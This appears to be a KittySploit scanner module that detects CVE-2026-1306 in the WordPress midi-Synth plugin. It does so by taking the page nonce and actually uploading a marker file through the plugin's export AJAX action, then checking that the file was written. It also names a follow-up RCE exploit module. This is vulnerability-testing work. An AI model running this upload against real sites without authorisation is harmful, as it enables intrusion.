#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""midi-Synth <= 1.1.0 export AJAX arbitrary upload (CVE-2026-1306)."""

import base64
import re
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "midi-synth"
_VULN_HIGH = (1, 1, 0)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "midi-Synth CVE-2026-1306 file upload detect",
        "description": (
            "Detects CVE-2026-1306: admin-ajax action=export writes attacker content to "
            "/wp-content/plugins/midi-synth/sound/{fileName} using frontend nonce."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-1306",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-1306",
        ],
        "modules": ["exploits/multi/http/midi_synth_cve_2026_1306_upload_rce"],
        "tags": ["web", "scanner", "wordpress", "midi-synth", "file-upload", "cve-2026-1306"],
        "agent": {
            "chain": {"suggested_followups": ["exploits/multi/http/midi_synth_cve_2026_1306_upload_rce"]},
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)
    _NONCE = re.compile(r'var midiSynth_nonce\s*=\s*"([a-z0-9]+)"', re.I)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        version = self.wp_plugin_version(_PLUGIN, self.wp_normalize_base_path(self.base_path or "/")) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        home = self.http_request(method="GET", path=self._join("/"), allow_redirects=True)
        if not home:
            return False
        m = self._NONCE.search(home.text or "")
        if not m:
            return False
        marker = secrets.token_hex(4)
        fname = f"ks{marker}.txt"
        data = {
            "action": "export",
            "nonce": m.group(1),
            "fileName": fname,
            "fileMidi": base64.b64encode(marker.encode()).decode(),
        }
        self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data=data,
            allow_redirects=False,
        )
        check = self.http_request(
            method="GET",
            path=self._join(f"/wp-content/plugins/midi-synth/sound/{fname}"),
            allow_redirects=False,
        )
        if check and check.status_code == 200 and marker in (check.text or ""):
            self.set_info(
                severity="critical",
                reason="midi-Synth CVE-2026-1306 arbitrary file write confirmed",
                path="/wp-content/plugins/midi-synth/sound/",
                cve="CVE-2026-1306",
            )
            return True
        return False
